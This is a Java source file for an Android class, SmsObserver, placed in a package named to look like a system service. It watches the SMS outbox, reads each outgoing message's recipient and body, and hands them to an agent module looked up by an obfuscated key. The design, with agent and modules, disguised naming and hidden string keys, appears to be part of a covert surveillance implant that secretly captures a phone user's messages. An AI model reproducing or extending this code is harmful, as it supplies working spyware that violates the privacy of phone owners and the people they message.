package com.android.service.interfaces;

import android.content.ContentResolver;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;

import com.android.service.Messages;
import com.android.service.Status;
import com.android.service.manager.ManagerAgent;
import com.android.service.module.ModuleMessage;
import com.android.service.module.message.Sms;

/**
 * http://stackoverflow.com/questions/3012287/how-to-read-mms-data-in-android
 */
public class SmsObserver extends ContentObserver {
	private static final String TAG = "SmsObserver"; //$NON-NLS-1$

	public SmsObserver(Handler handler) {
		super(handler);
	}

	@Override
	public void onChange(boolean bSelfChange) {
		super.onChange(bSelfChange);

		// messages: Messages.getString("b.9");
		ModuleMessage a = (ModuleMessage) ManagerAgent.self().get(Messages.getString("b.9"));

		if (a == null) {
			return;
		}

		final ContentResolver cr = Status.getAppContext().getContentResolver();

		// http://stackoverflow.com/questions/3012287/how-to-read-mms-data-in-android

		// Se questa non dovesse piu andare cambiare in "content://sms"
		// ManagerAgent.get("sms")
		// orig: content://sms/outbox

		/*
		 * I possibili content resolver sono Inbox = "content://sms/inbox"
		 * Failed = "content://sms/failed" Queued = "content://sms/queued" Sent
		 * = "content://sms/sent" Draft = "content://sms/draft" Outbox =
		 * "content://sms/outbox" Undelivered = "content://sms/undelivered" All
		 * = "content://sms/all" Conversations = "content://sms/conversations"
		 * All Conversations = "content://mms-sms/conversations" All messages =
		 * "content://mms-sms" All SMS = "content://sms"
		 */

		final Cursor cur = cr.query(Uri.parse("content://sms/outbox"), null, null, null, null); //$NON-NLS-1$

		while (cur.moveToNext()) {
			final String protocol = cur.getString(cur.getColumnIndex("protocol")); //$NON-NLS-1$

			if (protocol != null) {
				return;
			}

			final Sms s = onSmsSend(cur);
			a.notification(s);
		}

		cur.close();
	}

	private Sms onSmsSend(Cursor cur) {
		// int threadId = cur.getInt(cur.getColumnIndex("thread_id"));
		// int status = cur.getInt(cur.getColumnIndex("status"));

		final String body = cur.getString(cur.getColumnIndex("body")); //$NON-NLS-1$
		final String address = cur.getString(cur.getColumnIndex("address")); //$NON-NLS-1$

		return new Sms(address, body, System.currentTimeMillis(), true);
	}
}